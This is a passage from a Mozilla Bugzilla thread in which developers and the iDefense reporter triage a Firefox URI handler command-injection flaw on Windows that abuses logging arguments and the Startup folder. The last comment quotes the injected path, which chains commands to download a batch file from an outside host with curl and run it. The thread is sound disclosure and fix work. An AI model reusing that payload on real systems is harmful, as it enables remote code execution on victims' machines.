        id="ct-4" data-comment-id="14292470" data-ismarkdown="true" ><p>Took a little look into this.  I have not been able to verify this - I don&#39;t have MS Office on this machine, and as I couldn&#39;t create a working .url as described in comment zero. I was able to verify that  <code>firefoxurl-308046b0af4a39cb:</code> is a registered URL handler for Firefox on windows. No clue why that string specifically.  But I wasn&#39;t able to find a way to pass args to Firefox via that handler, but <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c0" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment 0</a> alludes to this being possible.</p>
<p>I have a lot of thoughts/questions though:</p>
<ol>
<li>
<p>Can they provide a sample .url file which demonstrates this issue? (or some other reliable way to trigger this?)</p>
</li>
<li>
<p>What windows version is this PoC tested to work on?</p>
</li>
<li>
<p>If an attacker can supply command line args to Firefox, then isn&#39;t it already game over?  (for example, if you can supply a --profile argument, then couldn&#39;t you just load a malicious profile which would give you control of firefox (assuming you could load a remote profile??)  [1]</p>
</li>
<li>
<p>In my testing, I saw multiple warning prompts, both from Firefox, and from the client programs (IE, windows etc) that I was opening the URL with. Did we get the PoC video, or can we ask if the PoC requires the user to click through a warning (Firefox or otherwise OS, other browser etc)</p>
</li>
</ol>
<p>[1] PS I tried to test this, and Firefox crashed :/</p>
</div></div><div class="change-set" id="c5"><div class="comment" data-id="14294198" data-no="5"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-5" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a6270_1689"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-5"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-5" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c5">Comment 5</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 00:44 PDT" data-time="1565595895">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-5">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-5" data-comment-id="14294198" data-ismarkdown="true" ><p>(In reply to Paul Theriault [:pauljt] (needinfo pls) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c4" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #4</a>)</p>
<blockquote>
<p>Took a little look into this.  I have not been able to verify this - I don&#39;t have MS Office on this machine, and as I couldn&#39;t create a working .url as described in comment zero. I was able to verify that  <code>firefoxurl-308046b0af4a39cb:</code> is a registered URL handler for Firefox on windows. No clue why that string specifically.  But I wasn&#39;t able to find a way to pass args to Firefox via that handler, but <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c0" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment 0</a> alludes to this being possible.</p>
</blockquote>
<p>Regarding the number: It seems this is the AppUserModelID we set. <a href="https://docs.microsoft.com/en-us/windows/win32/shell/appids" rel="nofollow">https://docs.microsoft.com/en-us/windows/win32/shell/appids</a></p>
<blockquote>
<ol start="3">
<li>If an attacker can supply command line args to Firefox, then isn&#39;t it already game over?  (for example, if you can supply a --profile argument, then couldn&#39;t you just load a malicious profile which would give you control of firefox (assuming you could load a remote profile??)  [1]</li>
</ol>
</blockquote>
<p>Very much this.</p>
</div></div><div class="change-set" id="c6"><div class="comment" data-id="14294943" data-no="6"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-6" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a6270_1689"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-6"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-6" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c6">Comment 6</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 08:11 PDT" data-time="1565622696">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-6">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-6" data-comment-id="14294943" data-ismarkdown="true" ><p>OK, so some notes:</p>
<ol>
<li>like others before me, I cannot reproduce locally. A working .url file (where all that needs changing is the path to the right folder for the given username) would really help, as well as details of what windows version they&#39;re using. If wordpad (rather than ms word) can be used to reproduce, details about how to check that would also really help.</li>
<li>The email notes that <code>LogCommandLineHandler.cpp</code> doesn&#39;t check osint, but it should. I think this assessment is correct. See <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1530103" title="VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox">bug 1530103</a>. We should probably audit if there are any other handlers that need checking here, and ideally do some work to make this a safe-by-default thing instead of forcing every handler to opt in. I did some searching at the time but didn&#39;t find this code; unsure why but either way it needs sorting out. Paul/Freddy, can you check?</li>
<li>As defense in depth, LogCommandLineHandler should probably find a way of specifying file names that doesn&#39;t execute arbitrary shell code. I&#39;m not familiar enough with Windows to offer concrete suggestions, but this seems like something that should be straightforward.</li>
<li>As <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c2" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #2</a> notes, the firefoxurl: regex in BrowserContentHandler is probably broken since (AFAICT) <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1324617" title="VERIFIED FIXED - If I try to switch default browser from Nightly to Firefox, I unexpectedly end up with Edge as my default">bug 1324617</a> forgot to update it when switching to per-release URLs. We should probably have a unit test of some sort on Windows. I don&#39;t know if that would actually fix this issue, because I can&#39;t reproduce (see (1)). Off-hand, AFAICT the firefoxurl-[goop]: thing goes to Windows, and Windows substitutes everything after the colon into a <code>Firefox.exe -osint -url &quot;&lt;everything&gt;&quot;</code> commandline, so there&#39;ll be no &quot;firefoxurl:&quot; on the commandline anyway, unless it&#39;s nested more than once or something. Matt, can you clarify what <code>firefoxurl:</code> is at this point, if my understanding of how this makes it into BrowserContentHandler is correct, and/or if we should just update the regex to match <code>firefox-url(-[a-f0-9]+)?:</code> or something ? Looks like we don&#39;t necessarily remove the old registry entry for firefoxurl: so we probably need to keep dealing with <code>firefoxurl:</code> as well...</li>
<li>Re: &quot;if you can pass Firefox arbitrary arguments, we&#39;re already hosed&quot; (<a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c4" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #4</a> / <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c5" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #5</a>) - not to the RCE extent, because people can and do pass us shitty things via the firefoxurl thing, see the history in <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=384384">https://bugzilla.mozilla.org/show_bug.cgi?id=384384</a> . The osint flag is supposed to save our bacon here. In fact, it looks like we check it for <code>-migration</code> and <code>-profile</code>, which is odd because the email cited in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c0" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #0</a> claims it helps the PoC somehow. I don&#39;t think we check it for the -P flag, which is OK because it&#39;s a bool that shows the profile manager, or selects an extant profile by name (so to do anything malicious, you&#39;d need to be able to write a profile + alter profiles.ini prior to running anything).</li>
</ol>
<p>TL;DR: we really need a working PoC so we can verify any fixes here, confirmation from the reporter which versions they&#39;ve tested with (the magical string of numbers will be different for nightly and possibly for beta/devedition) and clarify whether the protections on some of the other commandline flags are/aren&#39;t working given the conflicting information so far.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(vendor-disclosure)</div><div class="change">Flags: needinfo?(mhowell)</div><div class="change">Flags: <span class="activity-deleted">needinfo?(gijskruitbosch+bugs)</span></div></div></div><div class="change-set" id="c7"><div class="comment" data-id="14295087" data-no="7"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-7" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a6270_1689"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-7"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-7" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c7">Comment 7</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 09:01 PDT" data-time="1565625712">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-7">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-7" data-comment-id="14295087" data-ismarkdown="true" ><p>(In reply to :Gijs (he/him) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c6" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #6</a>)</p>
<blockquote>
<p>Matt, can you clarify what <code>firefoxurl:</code> is at this point, if my understanding of how this makes it into BrowserContentHandler is correct, and/or if we should just update the regex to match <code>firefox-url(-[a-f0-9]+)?:</code> or something ? Looks like we don&#39;t necessarily remove the old registry entry for firefoxurl: so we probably need to keep dealing with <code>firefoxurl:</code> as well...</p>
</blockquote>
<p>The string following <code>FirefoxURL-</code> is the install path hash, AKA the string returned from <a href="https://searchfox.org/mozilla-central/rev/ec806131cb7bcd1c26c254d25cd5ab8a61b2aeb6/toolkit/xre/nsXREDirProvider.cpp#1207" rel="nofollow"><code>nsIXREDirProvider.getInstallHash()</code></a> (we do also use this string as the AppUserModelID, as <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c5" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment 5</a> notes). I added these to the handler strings to make it possible to have more than one install of Firefox available to use for file associations; I wasn&#39;t aware of this validator regex, you&#39;re right that I should have updated it then. We do leave the old <code>FirefoxURL</code> handlers alone when they exist because the installer can&#39;t generally overwrite existing file associations without just breaking them, so you&#39;re right that either <code>FirefoxURL</code> on its own or with the suffix are both valid; I think your proposed change to the regex is correct (without the <code>-</code> in <code>firefoxurl</code>). Alternatively we could validate that the install hash is actually correct for that installation instead of just that it matches a regex, but I&#39;m not sure there&#39;s much need since the hash isn&#39;t intended to provide any security.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(mhowell)</span></div></div></div><div class="change-set" id="c8"><div class="comment" data-id="14295483" data-no="8"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-8" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_496127" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/106da6447bb158720110ea58f6a20676?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_496127" id="a6270_1689"><a class="email " href="/user_profile?user_id=496127" > <span class="fna">Eric Rahm [:erahm]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-8"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-8" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c8">Comment 8</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 11:46 PDT" data-time="1565635574">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-8">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-8" data-comment-id="14295483" data-ismarkdown="true" ><p>It seems like we should have some sort of opt-in for params that are allowed when <code>-osint</code> is specified rather than hoping that we remember to check them.</p>
<p>If I understand correctly, fixing things the current way means adding a <code>CheckArg</code> call to <a href="https://searchfox.org/mozilla-central/rev/ec806131cb7bcd1c26c254d25cd5ab8a61b2aeb6/toolkit/profile/nsToolkitProfileService.cpp#1170" rel="nofollow"><code>nsToolkitProfileService::SelectStartupProfile</code></a> and <a href="https://searchfox.org/mozilla-central/rev/ec806131cb7bcd1c26c254d25cd5ab8a61b2aeb6/browser/app/winlauncher/LauncherProcessWin.cpp#94" rel="nofollow"><code>ProcessCmdLine</code></a>, right?</p>
<p>It&#39;s also possible we should be using safer interface than <a href="https://searchfox.org/mozilla-central/rev/ec806131cb7bcd1c26c254d25cd5ab8a61b2aeb6/xpcom/base/Logging.cpp#330-348" rel="nofollow">directly using <code>fopen</code></a>, but I&#39;m not sure if we have anything that does validity checking on file paths.</p>
<p>Honza, is that something you can look into?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(honzab.moz)</div></div></div><div class="change-set" id="c9"><div class="comment" data-id="14295723" data-no="9"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-9" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a6270_1689"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-9"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-9" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c9">Comment 9</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 13:29 PDT" data-time="1565641793">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-9">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-9" data-comment-id="14295723" data-ismarkdown="true" ><p>(In reply to Eric Rahm [:erahm] from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c8" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #8</a>)</p>
<blockquote>
<p>It seems like we should have some sort of opt-in for params that are allowed when <code>-osint</code> is specified rather than hoping that we remember to check them.</p>
</blockquote>
<p>Yes, indeed.</p>
<blockquote>
<p>If I understand correctly, fixing things the current way means adding a <code>CheckArg</code> call to <a href="https://searchfox.org/mozilla-central/rev/ec806131cb7bcd1c26c254d25cd5ab8a61b2aeb6/toolkit/profile/nsToolkitProfileService.cpp#1170" rel="nofollow"><code>nsToolkitProfileService::SelectStartupProfile</code></a> and <a href="https://searchfox.org/mozilla-central/rev/ec806131cb7bcd1c26c254d25cd5ab8a61b2aeb6/browser/app/winlauncher/LauncherProcessWin.cpp#94" rel="nofollow"><code>ProcessCmdLine</code></a>, right?</p>
</blockquote>
<p>That&#39;d change our processing of <code>-P</code>, but for the MOZ_LOG* stuff, we need to change LogCommandLineHandler to call <code>CheckArg</code> (or have its own osint checks). It looks like that does its own manual processing of argv/argc, which explains why I missed it when I looked (for things that use the relevant xpcom interfaces or call checkarg but without that flag). This probably interacts poorly with any attempts to make the <code>osint</code> case more opt-out. That is, no matter how opt-out we make it, if people are going to add core xpcom code with hand-rolled argv/argc handling, I don&#39;t see how we can avoid that besides screamy comments saying &quot;do not touch argv/argc yourself&quot;.</p>
<p>I don&#39;t know if we need to disallow <code>-P</code> in combination with <code>-osint</code> - I guess it&#39;s possible people edit registry options to enforce external links opening in a specific profile or whatever, and I don&#39;t see a security vector in the use of <code>-P</code> with <code>-osint</code>. AFAICT all the issues are with the other flags...</p>
</div></div><div class="change-set" id="c10"><div class="comment" data-id="14295820" data-no="10"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-10" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_130370" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/47de91b6fa8015044d9105b8665eb9e0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_130370" id="a6270_1689"><a class="email " href="/user_profile?user_id=130370" > <span class="fna">iDefense Vendor Relations</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-10"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-10" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c10">Comment 10</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 14:24 PDT" data-time="1565645099">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-10">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9084871"
         class="attachment"
         data-id="9084871" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="Google.URL">
      <meta itemprop="contentSize" content="462">
      <meta itemprop="encodingFormat" content="application/octet-stream">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9084871" itemprop="contentUrl">
        <span id="att-9084871-description" itemprop="description">URL Shortcut PoC</span></a>
        — <a href="attachment.cgi?id=9084871&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <div
        class="comment-text markdown-body "
        id="ct-10" data-comment-id="14295820" data-ismarkdown="true" ><p>The URL shortcut has a link to the local folder. Please change the username and folder path accordingly before testing it.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(vendor-disclosure)</span></div></div></div><div class="change-set" id="c11"><div class="comment" data-id="14295825" data-no="11"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-11" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_130370" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/47de91b6fa8015044d9105b8665eb9e0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_130370" id="a6270_1689"><a class="email " href="/user_profile?user_id=130370" > <span class="fna">iDefense Vendor Relations</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-11"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-11" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c11">Comment 11</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 14:27 PDT" data-time="1565645264">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-11">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-11" data-comment-id="14295825" data-ismarkdown="true" ><p>Hello,<br>
We were able to test this on Firefox 68.0.1 (64 Bit) running on Windows 10 1809 64 bit</p>
<p>There are two ways to trigger the issue , locally by double clicking and remotely(via email) -<br>
a)The Provided URL shortcut file (Google.URL)  demonstrates the issue locally.<br>
b) Provided .htm file demonstrates the email attachment vector in Outlook(app not web outlook). Upon preview and clicking the link , the attack succeeds.</p>
<p>There is a prompt that gets displayed if you run the URL shortcut locally or preview the htm file via outlook that says - “Your Firefox Profile Cannot be Loaded. it may be missing or inaccessible”<br>
Important thing to note here is that the attack already succeeds by the time the prompt is displayed by writing to the startup folder on Windows which is<br>
C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
<p>Note: the preview feature in outlook seems to work via the native Outlook App and not in typical web outlook views where you can only download and not preview.</p>
<p>The demo video below shows the issue on Windows 10 Firefox 67<br>
<a href="https://drive.google.com/file/d/1CcItIq_PtehBJfVamykTSW-IW3u-Ce2Y/view" rel="nofollow">https://drive.google.com/file/d/1CcItIq_PtehBJfVamykTSW-IW3u-Ce2Y/view</a></p>
<p>-iDefense Labs</p>
</div></div><div class="change-set" id="c12"><div class="comment" data-id="14295844" data-no="12"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-12" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a6270_1689"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-12"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-12" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c12">Comment 12</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 14:34 PDT" data-time="1565645653">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-12">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-12" data-comment-id="14295844" data-ismarkdown="true" ><p>(In reply to iDefense Vendor Relations from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c11" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #11</a>)</p>
<blockquote>
<p>There is a prompt that gets displayed if you run the URL shortcut locally or preview the htm file via outlook that says - “Your Firefox Profile Cannot be Loaded. it may be missing or inaccessible”<br>
Important thing to note here is that the attack already succeeds by the time the prompt is displayed by writing to the startup folder on Windows which is<br>
C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
</blockquote>
<p>Oh, so the expectation is that calc isn&#39;t actually popped then, but only at the next restart? That was... not obvious from the report as filed...</p>
</div></div><div class="change-set" id="c13"><div class="comment" data-id="14295881" data-no="13"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-13" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_130370" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/47de91b6fa8015044d9105b8665eb9e0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_130370" id="a6270_1689"><a class="email " href="/user_profile?user_id=130370" > <span class="fna">iDefense Vendor Relations</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-13"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-13" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c13">Comment 13</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 14:52 PDT" data-time="1565646729">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-13">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-13" data-comment-id="14295881" data-ismarkdown="true" ><p>Apologies, if the report was not very clear regarding the attack but Yes, one could get code execution at next restart-in fact even a simple logoff-login to the account as well. So code execution but not immediate. While a bit restricted, it is still a powerful primitive</p>
</div></div><div class="change-set" id="c14"><div class="comment" data-id="14295968" data-no="14"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-14" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a6270_1689"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a6270_1689"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-14"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-14" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1572838#c14">Comment 14</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-12 15:15 PDT" data-time="1565648126">2 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1572838&amp;comment_id=14295968"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-14">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-14" data-comment-id="14295968" data-ismarkdown="true" ><p>(In reply to iDefense Vendor Relations from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c13" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #13</a>)</p>
<blockquote>
<p>Apologies, if the report was not very clear regarding the attack but Yes, one could get code execution at next restart-in fact even a simple logoff-login to the account as well. So code execution but not immediate. While a bit restricted, it is still a powerful primitive</p>
</blockquote>
<p>No, that&#39;s fine, it just helps to understand exactly what&#39;s going on, and to figure out what we can do about it.</p>
<p>(In reply to iDefense Vendor Relations from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed" href="/show_bug.cgi?id=1572838#c11" title="VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]">comment #11</a>)</p>
<blockquote>
<p>The demo video below shows the issue on Windows 10 Firefox 67<br>
<a href="https://drive.google.com/file/d/1CcItIq_PtehBJfVamykTSW-IW3u-Ce2Y/view" rel="nofollow">https://drive.google.com/file/d/1CcItIq_PtehBJfVamykTSW-IW3u-Ce2Y/view</a></p>
</blockquote>
<p>So in fact, looking at the video, I was wrong about MOZ_LOG running shell code - what happens is a file with this full path:</p>
<pre><code>C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\&amp;cd ..&amp;cd ..&amp;cd Users&amp;cd Public&amp;curl -o test.bat poc.mm2.in &amp;test.bat
</code></pre>
